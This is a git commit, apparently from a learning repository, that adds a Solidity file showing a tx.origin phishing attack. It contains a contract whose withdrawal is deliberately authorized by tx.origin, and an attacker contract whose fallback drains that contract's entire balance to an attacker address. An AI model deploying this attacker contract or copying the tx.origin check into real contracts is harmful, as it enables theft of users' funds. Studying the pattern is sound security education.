ce30fb7e3ba6e97417a1977828fadd7fdc713fd7
Anjanay Raina <anjanayraina326@gmail.com>
2022-12-05 19:30:07 +0530

    first commit

---
+++ PhishingAttacks/PhishingUsingTX.sol
@@ -0,0 +1,40 @@
+pragma solidity ^0.8.0;
+contract Phishable{
+    address public owner;
+    constructor(){
+        owner = msg.sender;
+
+    }
+    fallback() external payable{
+
+    }
+    receive() external payable{
+
+    }
+
+    function withdrawAll(address payable to) public {
+
+        require(tx.origin == owner);
+        to.call{value : address(this).balance}("");
+    }
+
+
+
+}
+
+
+pragma solidity ^0.8.0;
+import "Phishable.sol";
+contract PhishingAttacker{
+    address payable attacker;
+    Phishable smartContract;
+    constructor(Phishable _smartContract , address attackerAddress){
+        attacker = attackerAddress; // the address that you would like to send the funds to 
+        smartContract = _smartContract;  // saving the smart contract address 
+    }
+    fallback() payable external {
+        smartContract.withdrawAll(attacker); // initilizing the attack 
+    }
+}
+
+// for refrence : https://blog.sigmaprime.io/solidity-security.html#tx-origin
